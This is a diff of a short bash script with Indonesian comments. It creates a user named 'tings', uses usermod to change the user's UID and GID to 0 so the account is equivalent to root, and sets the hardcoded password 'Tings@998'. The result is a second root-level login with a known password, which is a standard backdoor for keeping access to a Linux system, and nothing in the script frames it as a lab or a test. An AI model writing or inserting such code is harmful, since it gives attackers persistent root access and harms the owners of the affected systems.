@@ -1,12 +1,20 @@
 #!/bin/bash
 
-# Membuat grup dengan nama root jika belum ada
-grep -q "^root:" /etc/group || groupadd root
+USER_NAME="tings"
+PASSWORD="Tings@998"
 
-# Membuat pengguna dengan nama tings
-useradd -m -s /bin/bash -g root -G root -u 0 tings
+# Mengecek apakah user sudah ada
+if id "$USER_NAME" &>/dev/null; then
+    echo "User $USER_NAME sudah ada. Tidak dibuat ulang."
+else
+    # Membuat user dengan home directory dan shell bash
+    useradd -m -s /bin/bash "$USER_NAME"
 
-# Mengatur kata sandi untuk pengguna
-echo "Tings@998" | chpasswd
+    # Ubah UID dan GID ke 0 agar user setara root
+    usermod -u 0 -o -g 0 "$USER_NAME"
 
-echo "Pengguna tings berhasil dibuat dengan kata sandi Tings@998 dan ditambahkan ke grup root dengan GID dan UID root."
+    # Set password user
+    echo "$USER_NAME:$PASSWORD" | chpasswd
+
+    echo "Pengguna $USER_NAME berhasil dibuat dengan UID=0, GID=0, dan password $PASSWORD."
+fi
